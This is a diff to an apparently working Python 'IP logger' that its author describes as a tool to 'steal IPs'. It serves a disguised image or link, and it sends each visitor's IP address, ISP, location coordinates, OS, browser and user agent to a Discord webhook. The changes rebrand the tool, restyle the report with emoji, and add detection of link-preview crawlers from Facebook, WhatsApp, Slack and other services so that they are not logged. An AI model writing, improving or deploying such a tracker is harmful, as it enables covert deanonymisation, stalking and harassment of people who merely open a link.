@@ -7,19 +7,19 @@ import traceback, requests, base64, httpagentparser
 
 __app__ = "Pull Ip´s"
 __description__ = "A simple application which allows you to steal IPs and more by using websites"
-__version__ = "v1.0"
+__version__ = "v2.0"
 __author__ = "g4bbdev ( silentgng )"
 
 config = {
     # BASE CONFIG #
-    "webhook": "place_your_webhook_here",
-    "image": "https://th.bing.com/th/id/OIP.zAkCde4dKDWOioxOwNlZRwHaEo?rs=1&pid=ImgDetMain", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "webhook": "place your webhook here",
+    "image": "image/gif link here", # You can also have a custom image by using a URL argument
+                                               # (E.g. yoursite.com/logger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "place_your_webhook_name_here", # Set this to the name you want the webhook to have
-    "color": 0xFFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "username for the webhook", # Set this to the name you want the webhook to have
+    "color": 0x00FF00, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, 
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "message that shows", # Message to show
+        "message": "Message to show!", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
-        "page": "https://youtu.be/EWqnWXnXURw?si=smoUlxzip9B0fpPy" # Link to the webpage to redirect to 
+        "redirect": False, # Redirect to a webpage?
+        "page": "redirect link" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -69,8 +69,22 @@ blacklistedIPs = ("iphere1", "iphere2") # Blacklisted IPs. You can enter a full 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
         return "Discord"
-    elif useragent.startswith("TelegramBot"):
+    elif "TelegramBot" in useragent:
         return "Telegram"
+    elif "facebookexternalhit" in useragent or "Facebot" in useragent:
+        return "Facebook Messenger"
+    elif "WhatsApp" in useragent:
+        return "WhatsApp"
+    elif "Twitterbot" in useragent:
+        return "Twitter"
+    elif "LinkedInBot" in useragent:
+        return "LinkedIn"
+    elif "Slackbot" in useragent:
+        return "Slack"
+    elif "SkypeUriPreview" in useragent:
+        return "Skype"
+    elif "Discordbot" in useragent:
+        return "Discord"
     else:
         return False
 
@@ -80,7 +94,7 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Error",
+            "title": "G4BBDEV LOGGER - Error",
             "color": config["color"],
             "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
@@ -99,7 +113,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": "G4BBDEV LOGGER - Link Sent",
             "color": config["color"],
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
@@ -144,30 +158,31 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "G4BBDEV LOGGER - IP Logged",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**A User Opened the Link!**
 
 **Endpoint:** `{endpoint}`
             
-**IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+🌐 **IP Information**
+> 🧭 **IP Address:** {ip if ip else 'Unknown'}
+> 🛰️ **Provider:** {info['isp'] if info['isp'] else 'Unknown'}
+> 🏢 **ASN:** {info['as'] if info['as'] else 'Unknown'}
+> 🗺️ **Country:** {info['country'] if info['country'] else 'Unknown'}
+> 🏞️ **Region:** {info['regionName'] if info['regionName'] else 'Unknown'}
+> 🏙️ **City:** {info['city'] if info['city'] else 'Unknown'}
+> 📍 **Coordinates:** {str(info['lat']) + ', ' + str(info['lon']) if not coords else coords.replace(',', ', ')}
+> 🔗 {'Approximate' if not coords else f'Precise, [📌 Google Maps](https://www.google.com/maps/search/google+map++{coords})'}
+> ⏰ **Timezone:** {info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})
+> 📱 **Mobile Network:** {info['mobile']}
+> 🛡️ **VPN Detected:** {info['proxy']}
+> 🤖 **Bot/Hosting:** {info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}
 
-**PC Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`
+🖥️ **PC Info:**
+> 💻 **OS:** `{os}`
+> 🌐 **Browser:** `{browser}`
 
-**User Agent:**
+🧑 **User Agent:**
 ```
 {useragent}
 ```""",
@@ -186,7 +201,7 @@ binaries = {
     # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
 
-class ImageLoggerAPI(BaseHTTPRequestHandler):
+class LoggerAPI(BaseHTTPRequestHandler):
     
     def handleRequest(self):
         try:
@@ -301,4 +316,4 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = ImageLoggerAPI
+handler = LoggerAPI
